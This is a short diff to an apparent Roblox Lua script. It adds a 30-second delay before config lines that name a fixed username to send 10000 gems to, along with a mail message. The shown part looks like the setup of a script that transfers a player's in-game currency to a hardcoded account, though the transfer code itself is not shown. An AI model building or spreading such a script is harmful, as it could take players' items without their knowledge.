@@ -1,3 +1,4 @@
+task.wait(30)
 local UserToSendTo = "pstar7754xxz" -- Username To Send Gems To
 local GemsAmount = 10000 -- dont touch it... main sript call the value already.. so he gets save he has always gems to be able to send mail 
 local Message = "Hello"
